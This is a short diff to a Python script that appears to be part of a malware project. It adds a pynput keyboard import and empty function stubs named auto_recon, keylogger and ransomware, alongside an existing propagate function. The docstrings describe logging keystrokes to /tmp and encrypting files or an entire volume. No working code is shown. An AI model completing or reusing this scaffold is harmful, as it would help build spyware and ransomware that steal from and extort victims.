@@ -13,6 +13,7 @@ try:
 	from os import devnull # Import devnull from os to send stderr to devnull.
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
+	from pynput import keyboard # Import keyboard to perform keylogger operations.
 except Exception:
     exit(1)
     
@@ -66,6 +67,33 @@ def propagate(name: str):
 		Returns:
 			None
 	"""
+
+def auto_recon():
+	"""This function will perform basic reconnaissance on the target machines.
+		
+		Arguments:
+
+		Returns:
+
+	"""
+
+def keylogger():
+	"""This function will start a keylogger in the background and will save its
+		contents to /tmp folder.
+
+		Arguments:
+
+		Returns:
+
+	"""
+def ransomware():
+	"""This function will encrypt a folder, a file, or the entire volume on a computer.
+
+		Arguments:
+		
+		Returns
+	"""
+
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
